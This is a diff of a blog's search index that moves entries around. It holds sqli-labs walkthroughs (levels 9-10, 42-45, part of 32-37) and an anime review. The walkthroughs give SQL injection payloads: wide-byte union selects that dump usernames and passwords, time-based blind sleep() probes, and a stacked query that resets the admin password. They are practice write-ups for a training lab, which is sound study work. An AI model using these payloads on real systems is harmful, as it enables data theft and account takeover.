-<li><p>猜解SQL查询语句中的字段数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1%df&#x27; order by 4 --+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>爆出显示位</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>获取当前数据库名和数据库版本号</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,version(),database() --+</span><br></pre></td></tr></table></figure>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+        <category>sqli-labs</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-labs_42-45</title>
+    <url>/2022/11/19/sqli-labs_42-45/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>周末学习的开始</p>
+<span id="more"></span>
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
+<li><p>测试并判断注入类型<br>查看源码，在login.php中注意到这样的语句</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>];</span><br></pre></td></tr></table></figure>
+<p>我们可以发现，username被过滤了，但是password没有被过滤<br>因此我们可以考虑从password处进行注入<br>然后，通过对堆叠注入的尝试，我们发现也是可行的。<br>于是，我们可以有两种方式。<br>一是常规方式，二是通过堆叠注入修改管理员密码从而登录</p>
 </li>
 <li><p><strong>爆表</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database()) --+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #</span><br></pre></td></tr></table></figure>
 </li>
 <li><p><strong>爆字段名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  --+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; #</span><br></pre></td></tr></table></figure>
 </li>
 <li><p><strong>爆数据</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,(select group_concat(username,0x3a,password) from users)--+</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(username,&#x27;:&#x27;,password),2 from users #</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>修改管理员密码(可以直接做)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;update users set password=&#x27;111111&#x27;  where username=&#x27;admin&#x27;#</span><br></pre></td></tr></table></figure></li>
 </ol>
-<h1 id="第37关"><a href="#第37关" class="headerlink" title="第37关"></a>第37关</h1><p>和第34关差不多，这一关网上有说按第34关第1种方法能成功，但我没成功<br>因此我选择第2种，使用burp抓包注入。</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>毫无难度</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
+<h2 id="第43关"><a href="#第43关" class="headerlink" title="第43关"></a>第43关</h2><p>与第42关差不多，只不过闭合方式为’)</p>
+<h2 id="第44关"><a href="#第44关" class="headerlink" title="第44关"></a>第44关</h2><p>与第42关差不多，只是不能使用报错注入</p>
+<h2 id="第45关"><a href="#第45关" class="headerlink" title="第45关"></a>第45关</h2><p>与第43关差不多，只是闭合方式为’)</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>向前走,不回头~</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/qq_43395215/article/details/108245668">sqli-labs(38-53)</a><br><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
 ]]></content>
       <categories>
         <category>SQL注入</category>
@@ -5483,43 +5540,6 @@ mysqli_multi_query()函数作用是：执行一个SQL语句，或者多个使用
 <h2 id="第47关"><a href="#第47关" class="headerlink" title="第47关"></a>第47关</h2><p>与第46关相比差不多，只是闭合方式为’</p>
 <h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>有些时候注入的方式不止一种，我们只需选择自己最擅长以及最迅速有效的方法即可</p>
 <h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a><br><a href="https://blog.csdn.net/hxhxhxhxx/article/details/107643024">sqli-labs大详解（完结）</a><br><a href="https://blog.csdn.net/qq_43395215/article/details/108245668">sqli-labs(38-53)</a></p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-        <category>sqli-labs</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>sqli-labs</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqli-labs_42-45</title>
-    <url>/2022/11/19/sqli-labs_42-45/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>周末学习的开始</p>
-<span id="more"></span>
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>测试并判断注入类型<br>查看源码，在login.php中注意到这样的语句</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>];</span><br></pre></td></tr></table></figure>
-<p>我们可以发现，username被过滤了，但是password没有被过滤<br>因此我们可以考虑从password处进行注入<br>然后，通过对堆叠注入的尝试，我们发现也是可行的。<br>于是，我们可以有两种方式。<br>一是常规方式，二是通过堆叠注入修改管理员密码从而登录</p>
-</li>
-<li><p><strong>爆表</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆字段名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; #</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆数据</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(username,&#x27;:&#x27;,password),2 from users #</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>修改管理员密码(可以直接做)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;update users set password=&#x27;111111&#x27;  where username=&#x27;admin&#x27;#</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="第43关"><a href="#第43关" class="headerlink" title="第43关"></a>第43关</h2><p>与第42关差不多，只不过闭合方式为’)</p>
-<h2 id="第44关"><a href="#第44关" class="headerlink" title="第44关"></a>第44关</h2><p>与第42关差不多，只是不能使用报错注入</p>
-<h2 id="第45关"><a href="#第45关" class="headerlink" title="第45关"></a>第45关</h2><p>与第43关差不多，只是闭合方式为’)</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>向前走,不回头~</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/qq_43395215/article/details/108245668">sqli-labs(38-53)</a><br><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
 ]]></content>
       <categories>
         <category>SQL注入</category>
@@ -5797,6 +5817,46 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
+    <title>sqli-labs_9+10</title>
+    <url>/2022/11/09/sqli-labs_9+10/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次第九关既不能显示正确，也不会显示错误。因此不能使用布尔盲注，只能使用<a href="https://truthnian.github.io/2022/11/09/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">时间盲注</a>。</p>
+<span id="more"></span>
+
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
+<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>输入?id&#x3D;1  显示：You are in………..<br>输入?id&#x3D;1’ 显示：You are in………..<br>输入?id&#x3D;1” 显示：You are in………..<br>此时我们应该发现端倪，页面可能不会返回任何信息<br>输入?id&#x3D;1 and sleep(5)--+  页面迅速显示<br>输入?id&#x3D;1’and sleep(5)--+  页面延迟了5s，说明的确是应当使用时间盲注<br>输入?id&#x3D;1’’and sleep(5)--+  页面迅速显示<br>说明是单引号字符型注入</p>
+</li>
+<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select database()))&gt;7,sleep(5),1)--+    页面迅速显示</span><br><span class="line">?id=1&#x27;and if(length((select database()))&gt;8,sleep(5),1)--+    页面延迟了5s</span><br></pre></td></tr></table></figure>
+<p>说明数据库名长度是8个字符<br>版本号以此类推</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(ascii(substr((select database()),1,1))&gt;115,sleep(5),1)--+   页面迅速显示</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select database()),1,1))&gt;114,sleep(5),1)--+   页面延迟了5s</span><br></pre></td></tr></table></figure>
+<p>最终尝试完后可得数据库名是security</p>
+</li>
+<li><p><strong>爆表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)--+</span><br><span class="line">如此判断所有表名长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">再逐一判断表名</span><br></pre></td></tr></table></figure>
+<p>最终尝试完后可得所需表名为users</p>
+</li>
+<li><p><strong>爆字段名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))&gt;20,sleep(5),1)--+</span><br><span class="line">判断所有字段名的长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断字段名</span><br></pre></td></tr></table></figure>
+<p>最终出现了我们所需的字段名username, password</p>
+</li>
+<li><p><strong>爆数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)--+</span><br><span class="line">判断字段内容长度</span><br><span class="line">?id=1&#x27; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</span><br><span class="line">逐一检测内容</span><br></pre></td></tr></table></figure>
+<p>最终得到了所需的数据</p>
+</li>
+</ol>
+<h2 id="第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号"><a href="#第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号" class="headerlink" title="第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号"></a>第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号</h2><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我终于知道为什么别人写博客，有些关会写得相当简略了，因为都是一样的，确实没意思…</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+        <category>sqli-labs</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqlmap使用</title>
     <url>/2022/11/21/sqlmap%E4%BD%BF%E7%94%A8/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>其实是有些犹豫，要不要写这一篇的，因为觉得自己学得很浅显。<br>想了想，还是写下来吧。毕竟这个工具我是从一张白纸开始，如果不写笔记，说不定很快会忘记。</p>
@@ -5845,46 +5905,6 @@ secure_file_priv 一栏的value为空，即是成功</li>
       <tags>
         <tag>SQL注入</tag>
         <tag>工具</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqli-labs_9+10</title>
-    <url>/2022/11/09/sqli-labs_9+10/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次第九关既不能显示正确，也不会显示错误。因此不能使用布尔盲注，只能使用<a href="https://truthnian.github.io/2022/11/09/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">时间盲注</a>。</p>
-<span id="more"></span>
-
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>输入?id&#x3D;1  显示：You are in………..<br>输入?id&#x3D;1’ 显示：You are in………..<br>输入?id&#x3D;1” 显示：You are in………..<br>此时我们应该发现端倪，页面可能不会返回任何信息<br>输入?id&#x3D;1 and sleep(5)--+  页面迅速显示<br>输入?id&#x3D;1’and sleep(5)--+  页面延迟了5s，说明的确是应当使用时间盲注<br>输入?id&#x3D;1’’and sleep(5)--+  页面迅速显示<br>说明是单引号字符型注入</p>
-</li>
-<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select database()))&gt;7,sleep(5),1)--+    页面迅速显示</span><br><span class="line">?id=1&#x27;and if(length((select database()))&gt;8,sleep(5),1)--+    页面延迟了5s</span><br></pre></td></tr></table></figure>
-<p>说明数据库名长度是8个字符<br>版本号以此类推</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(ascii(substr((select database()),1,1))&gt;115,sleep(5),1)--+   页面迅速显示</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select database()),1,1))&gt;114,sleep(5),1)--+   页面延迟了5s</span><br></pre></td></tr></table></figure>
-<p>最终尝试完后可得数据库名是security</p>
-</li>
-<li><p><strong>爆表</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)--+</span><br><span class="line">如此判断所有表名长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">再逐一判断表名</span><br></pre></td></tr></table></figure>
-<p>最终尝试完后可得所需表名为users</p>
-</li>
-<li><p><strong>爆字段名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))&gt;20,sleep(5),1)--+</span><br><span class="line">判断所有字段名的长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断字段名</span><br></pre></td></tr></table></figure>
-<p>最终出现了我们所需的字段名username, password</p>
-</li>
-<li><p><strong>爆数据</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)--+</span><br><span class="line">判断字段内容长度</span><br><span class="line">?id=1&#x27; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</span><br><span class="line">逐一检测内容</span><br></pre></td></tr></table></figure>
-<p>最终得到了所需的数据</p>
-</li>
-</ol>
-<h2 id="第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号"><a href="#第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号" class="headerlink" title="第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号"></a>第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号</h2><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我终于知道为什么别人写博客，有些关会写得相当简略了，因为都是一样的，确实没意思…</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-        <category>sqli-labs</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>sqli-labs</tag>
       </tags>
   </entry>
   <entry>
@@ -6574,6 +6594,36 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
+    <title>孤独摇滚--忐忑不安的吉他英雄</title>
+    <url>/2022/12/26/%E5%AD%A4%E7%8B%AC%E6%91%87%E6%BB%9A%E5%8A%A8%E7%94%BB/</url>
+    <content><![CDATA[<p><img src="/images/band_2.png" alt="band"></p>
+<span id="more"></span>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>也许是今年看得最开心的新作动画。</p>
+<h1 id="第一印象"><a href="#第一印象" class="headerlink" title="第一印象"></a>第一印象</h1><p>孤独摇滚是芳文社出版的四格漫画，老实说，虽然早就知道将要出动画，由于四格漫画画面太小，让人难以看进去，于是也就没有预先看漫画了。<br>看pv时，其实没有特别在意啦，只是预感会是一部还不错的动画，没想到最终大大超出预期，是一个很棒的惊喜~</p>
+<h1 id="精妙的演出"><a href="#精妙的演出" class="headerlink" title="精妙的演出"></a>精妙的演出</h1><p>应当好好感谢制作组，如果中规中矩按照原作制作动画，大概会是中上水准，可却难以成为大多数人每周最期待的一部动画吧。<br>看动画时第一重要的是有趣，而动画也的确非常有趣，无论是在喜剧部分还是推动情节发展的地方都是“各司其职”，有条不紊。既不让人觉得混乱，也能看得十分开心。</p>
+<ul>
+<li><strong>创新性</strong><br>第1话运用的几个不同寻常的镜头很是吸引我：超广角，腿部运动镜头。这些对我来说都有一种新奇的美感。<br>不止如此，在乐队演奏方面也是不走寻常路，比如第8话十分重要的乐队演出，一般而言，这种重要的情景都会把其演奏过程制作得具有观赏性，而制作组明知这一点还是将一个很“烂”的live完全表现出来了。不得不说，虽然在演奏上是失败的，但如此大胆的策略让剧情更加自然，也一定会被很多人记住吧。</li>
+<li><strong>想象力</strong><br>想象力是演出有趣与否的重要因素，在这方面，制作组拿出了：写实场景的水坝，3D建模，毕加索画作…一系列让人眼前一亮的元素，令人赞不绝口！</li>
+<li><strong>契合度</strong><br>人物方面的契合度至少90%以上。波奇的声优甚至就是社恐，更是有一种声优与角色融为一体的感觉。我认为选择这样的声优比选知名声优好多了，无论一个声优多么有人气或是多么美丽，只要不适合，都应当一票否决。</li>
+</ul>
+<h1 id="观众的共鸣"><a href="#观众的共鸣" class="headerlink" title="观众的共鸣"></a>观众的共鸣</h1><p>本作在社恐方面做足了细节，这也直接导致了观众对这部作品产生强烈共鸣，将角色代入自身。虽然观众大多不会对社交完全恐惧，同样也不会完全外向。生活中的人们，多多少少有些社交上的恐惧感，尽管不如波奇，也只不过是层级不同罢了。<br>随便一举都有很多：期望别人主动和自己搭话、不敢直视别人、不会拒绝别人、不敢去人多的地方、穿着土气、弯腰驼背、害怕冒犯别人、团队协作能力较差、别人一夸赞自己就沾沾自喜或者觉得这个人是好人、没有外号、不会跟不熟的人打招呼、没有朋友、不敢一个人进店、想去没有同学认识自己的地方、独来独往、会进入自己的世界、无法打工、一个人吃饭、喜欢幻想、几个人说话的时候插不上嘴……细节太多怎也道不完。有些比较夸张，可这是喜剧，也没必要纠结了。<br>孤单与喜欢独处的人是不一样的。波奇是孤单的人，但凉是喜欢独处并且充满自信。我大概也是和凉更为相像吧。</p>
+<h1 id="喜剧的剖析"><a href="#喜剧的剖析" class="headerlink" title="喜剧的剖析"></a>喜剧的剖析</h1><p>本作中主要出现的喜剧方面有，因波奇的内向而让她作出与常人不同的行为或想法而产生的反差造成的喜感，或是通过画面夸张化波奇的社恐心理（波奇融化，波奇变成赛博朋克，波奇变成恐龙等等），还有乐队四人不同个性的有趣小日常。</p>
+<h1 id="乐队的成长"><a href="#乐队的成长" class="headerlink" title="乐队的成长"></a>乐队的成长</h1><p>波奇从一个害怕与人社交的高中生，最终成为乐队里不可或缺的一份子。中间也是一路艰辛啊。<br>第1阶段，无法与乐队成员在演奏上好好配合，无论什么事都很被动，也很害怕与人打交道，甚至无法在台上露脸演奏。（1话）<br>第2阶段，稍微变得主动了一些，也能够独自进店了，打工时勉强能直视顾客的眼睛。还是害怕与别人有所不同，一旦做了什么错事或没做到什么会害怕得不能自已，看到别人享受青春的样子会很难受，不敢与别人搭话。（2-7话）<br>第3阶段，配合变好了一些，乐队之间的关系更加亲密了。（8-12话）</p>
+<p>喜多从第3话一个乐队外行人到了最终话演奏的时候也变得能够独自演奏一些片段了。</p>
+<p>整个乐队从配合松散的四人慢慢变为了有默契的四人，一起打工，一起游玩，一起演奏，一起出行…四人一起更加有乐队的感觉了。</p>
+<h1 id="杂谈"><a href="#杂谈" class="headerlink" title="杂谈"></a>杂谈</h1><p>虽然只有短短12话，我却看得十分尽兴。<br>第5话，第8话，第12话这三段演奏都做得非常好，即便如此，还是有部分人不满，原因很简单，没有爆点。追求快的时代，拿不出一个爆点的话，那么是很难吸引快节奏人的目光的。从我个人的意愿来说，也不例外，希望有能够惊为天人的live。虽然没有期待到啦，不过也不至于成为挑刺的地方。三段演奏都是蛮棒的，写实的风格，创新的演出，越看越耐看的live，都是无可挑剔的。<br>最喜欢的角色嘛，是虹夏。现在虹夏已经被大家尊称为“下北泽の大天使”了hhh。<br>如果说我在四个人里最像凉，那么大概也能明白为什么一开始凉是和虹夏一起的了。若要问喜欢的原因，大概是那份细腻感吧，能够注意到乐队其他人不会注意到的事，而且还那么温柔，与喜多那种外向的阳光普照大地不同，虹夏的阳光是单独照射着她所在意的人的。还有也非常可爱啊，第5话最后那个告别怎能叫人不心动呢！<br><img src="/images/%E8%99%B9%E5%A4%8F_4.gif" alt="虹夏告别"></p>
+<h1 id="总的来说"><a href="#总的来说" class="headerlink" title="总的来说"></a>总的来说</h1><p>赶紧出下一季！</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>动画评价写得好烂，还写了那么久，什么时候能写好一点啊！</p>
+]]></content>
+      <categories>
+        <category>动画</category>
+        <category>孤独摇滚</category>
+      </categories>
+      <tags>
+        <tag>孤独摇滚</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>如何寻觅动画</title>
     <url>/2022/11/04/%E5%8A%A8%E6%BC%AB%E8%B5%84%E6%BA%90/</url>
     <content><![CDATA[<p><img src="/images/%E9%98%BF%E5%BD%BB.gif" alt="托尔"></p>
@@ -6703,36 +6753,6 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </categories>
       <tags>
         <tag>读书笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>孤独摇滚--忐忑不安的吉他英雄</title>
-    <url>/2022/12/26/%E5%AD%A4%E7%8B%AC%E6%91%87%E6%BB%9A%E5%8A%A8%E7%94%BB/</url>
-    <content><![CDATA[<p><img src="/images/band_2.png" alt="band"></p>
-<span id="more"></span>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>也许是今年看得最开心的新作动画。</p>
-<h1 id="第一印象"><a href="#第一印象" class="headerlink" title="第一印象"></a>第一印象</h1><p>孤独摇滚是芳文社出版的四格漫画，老实说，虽然早就知道将要出动画，由于四格漫画画面太小，让人难以看进去，于是也就没有预先看漫画了。<br>看pv时，其实没有特别在意啦，只是预感会是一部还不错的动画，没想到最终大大超出预期，是一个很棒的惊喜~</p>
-<h1 id="精妙的演出"><a href="#精妙的演出" class="headerlink" title="精妙的演出"></a>精妙的演出</h1><p>应当好好感谢制作组，如果中规中矩按照原作制作动画，大概会是中上水准，可却难以成为大多数人每周最期待的一部动画吧。<br>看动画时第一重要的是有趣，而动画也的确非常有趣，无论是在喜剧部分还是推动情节发展的地方都是“各司其职”，有条不紊。既不让人觉得混乱，也能看得十分开心。</p>
-<ul>
-<li><strong>创新性</strong><br>第1话运用的几个不同寻常的镜头很是吸引我：超广角，腿部运动镜头。这些对我来说都有一种新奇的美感。<br>不止如此，在乐队演奏方面也是不走寻常路，比如第8话十分重要的乐队演出，一般而言，这种重要的情景都会把其演奏过程制作得具有观赏性，而制作组明知这一点还是将一个很“烂”的live完全表现出来了。不得不说，虽然在演奏上是失败的，但如此大胆的策略让剧情更加自然，也一定会被很多人记住吧。</li>
-<li><strong>想象力</strong><br>想象力是演出有趣与否的重要因素，在这方面，制作组拿出了：写实场景的水坝，3D建模，毕加索画作…一系列让人眼前一亮的元素，令人赞不绝口！</li>
-<li><strong>契合度</strong><br>人物方面的契合度至少90%以上。波奇的声优甚至就是社恐，更是有一种声优与角色融为一体的感觉。我认为选择这样的声优比选知名声优好多了，无论一个声优多么有人气或是多么美丽，只要不适合，都应当一票否决。</li>
-</ul>
-<h1 id="观众的共鸣"><a href="#观众的共鸣" class="headerlink" title="观众的共鸣"></a>观众的共鸣</h1><p>本作在社恐方面做足了细节，这也直接导致了观众对这部作品产生强烈共鸣，将角色代入自身。虽然观众大多不会对社交完全恐惧，同样也不会完全外向。生活中的人们，多多少少有些社交上的恐惧感，尽管不如波奇，也只不过是层级不同罢了。<br>随便一举都有很多：期望别人主动和自己搭话、不敢直视别人、不会拒绝别人、不敢去人多的地方、穿着土气、弯腰驼背、害怕冒犯别人、团队协作能力较差、别人一夸赞自己就沾沾自喜或者觉得这个人是好人、没有外号、不会跟不熟的人打招呼、没有朋友、不敢一个人进店、想去没有同学认识自己的地方、独来独往、会进入自己的世界、无法打工、一个人吃饭、喜欢幻想、几个人说话的时候插不上嘴……细节太多怎也道不完。有些比较夸张，可这是喜剧，也没必要纠结了。<br>孤单与喜欢独处的人是不一样的。波奇是孤单的人，但凉是喜欢独处并且充满自信。我大概也是和凉更为相像吧。</p>
-<h1 id="喜剧的剖析"><a href="#喜剧的剖析" class="headerlink" title="喜剧的剖析"></a>喜剧的剖析</h1><p>本作中主要出现的喜剧方面有，因波奇的内向而让她作出与常人不同的行为或想法而产生的反差造成的喜感，或是通过画面夸张化波奇的社恐心理（波奇融化，波奇变成赛博朋克，波奇变成恐龙等等），还有乐队四人不同个性的有趣小日常。</p>
-<h1 id="乐队的成长"><a href="#乐队的成长" class="headerlink" title="乐队的成长"></a>乐队的成长</h1><p>波奇从一个害怕与人社交的高中生，最终成为乐队里不可或缺的一份子。中间也是一路艰辛啊。<br>第1阶段，无法与乐队成员在演奏上好好配合，无论什么事都很被动，也很害怕与人打交道，甚至无法在台上露脸演奏。（1话）<br>第2阶段，稍微变得主动了一些，也能够独自进店了，打工时勉强能直视顾客的眼睛。还是害怕与别人有所不同，一旦做了什么错事或没做到什么会害怕得不能自已，看到别人享受青春的样子会很难受，不敢与别人搭话。（2-7话）<br>第3阶段，配合变好了一些，乐队之间的关系更加亲密了。（8-12话）</p>
-<p>喜多从第3话一个乐队外行人到了最终话演奏的时候也变得能够独自演奏一些片段了。</p>
-<p>整个乐队从配合松散的四人慢慢变为了有默契的四人，一起打工，一起游玩，一起演奏，一起出行…四人一起更加有乐队的感觉了。</p>
